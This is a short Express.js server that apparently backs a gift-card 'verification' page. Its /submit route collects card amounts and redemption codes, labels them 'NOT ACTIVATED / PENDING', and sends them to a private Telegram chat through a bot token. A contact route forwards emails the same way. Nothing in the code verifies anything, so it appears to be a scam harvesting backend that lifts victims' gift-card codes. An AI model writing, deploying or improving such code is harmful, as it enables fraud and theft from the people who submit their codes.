const express = require("express");
const bodyParser = require("body-parser");
const axios = require("axios");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

app.use(bodyParser.json());
app.use(express.static(path.join(__dirname))); // serve index.html

// Serve frontend
app.get("/", (req,res)=> res.sendFile(path.join(__dirname,"index.html")));

// Verification form
app.post("/submit", async (req,res)=>{
  const {s1,s2,cardAmount,redemptionCode} = req.body;
  const text = `✅ New Verification Submission\n\nOption 1: ${s1}\nOption 2: ${s2}\nCard Amount: ${cardAmount}\nRedemption Code: ${redemptionCode}\nStatus: NOT ACTIVATED / PENDING`;
  try{
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{ chat_id: CHAT_ID, text });
    res.sendStatus(200);
  }catch(err){ console.error(err); res.sendStatus(500); }
});

// Contact form
app.post("/contact", async (req,res)=>{
  const {email,message} = req.body;
  const text = `📩 New Contact Message\n\n📧 Email: ${email}\n💬 Message:\n${message}`;
  try{
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{ chat_id: CHAT_ID, text });
    res.sendStatus(200);
  }catch(err){ console.error(err); res.sendStatus(500); }
});

app.listen(PORT, ()=>console.log(`Server running on port ${PORT}`));
